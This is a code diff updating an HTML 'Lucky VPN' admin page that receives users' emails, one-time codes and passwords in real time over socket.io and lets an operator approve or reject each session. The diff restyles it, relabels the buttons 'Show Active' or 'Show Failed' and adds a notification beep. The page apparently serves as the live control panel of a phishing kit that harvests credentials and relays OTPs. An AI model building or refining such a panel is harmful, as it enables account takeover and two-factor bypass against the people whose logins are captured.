@@ -1,40 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Lucky VPN - Admin Control</title>
+    <meta charset="UTF-8">
+    <title>Admin - Lucky VPN Control</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
-        .card { background: white; padding: 15px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #ddd; }
-        button { padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; color: white; margin-right: 5px; }
-        .btn-ok { background: green; }
-        .btn-no { background: red; }
+        body { font-family: sans-serif; background: #eef2f3; padding: 30px; }
+        .request-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 20px; border-left: 5px solid #007bff; }
+        h2 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
+        button { padding: 10px 25px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; color: white; margin-right: 10px; }
+        .btn-approve { background: #28a745; }
+        .btn-reject { background: #dc3545; }
+        .data-label { font-weight: bold; color: #555; }
     </style>
 </head>
 <body>
-    <h2>Admin Control Panel (Live)</h2>
+    <h2>Lucky VPN Live Requests</h2>
     <div id="requests"></div>
 
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    
     <script>
-        const socket = io(); // Connect to server
+        const socket = io();
 
         socket.on('admin_receive_data', (data) => {
             const div = document.createElement('div');
-            div.className = 'card';
+            div.className = 'request-card';
+            div.id = 'req-' + data.id;
+            
             div.innerHTML = `
-                <p><strong>Type:</strong> ${data.type}</p>
-                <p><strong>Email/OTP:</strong> ${data.email || data.otp || 'N/A'}</p>
-                <p><strong>Password:</strong> ${data.pass || 'N/A'}</p>
-                <button class="btn-ok" onclick="respond('${data.id}', 'OK')">Approve (Active)</button>
-                <button class="btn-no" onclick="respond('${data.id}', 'NO')">Reject (Not Active)</button>
+                <p><span class="data-label">Type:</span> ${data.type.toUpperCase()}</p>
+                <p><span class="data-label">Email/OTP:</span> ${data.email || data.otp || 'N/A'}</p>
+                <p><span class="data-label">Password:</span> ${data.pass || 'N/A'}</p>
+                <button class="btn-approve" onclick="respond('${data.id}', 'OK')">APPROVE (Show Active)</button>
+                <button class="btn-reject" onclick="respond('${data.id}', 'NO')">REJECT (Show Failed)</button>
             `;
             document.getElementById('requests').prepend(div);
+            
+            // Notification sound
+            const bell = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
+            bell.play().catch(() => {}); 
         });
 
         function respond(userId, status) {
             socket.emit('admin_decision', { userId, status });
-            alert("Sent: " + status);
+            alert("Response Sent: " + status);
         }
     </script>
 </body>
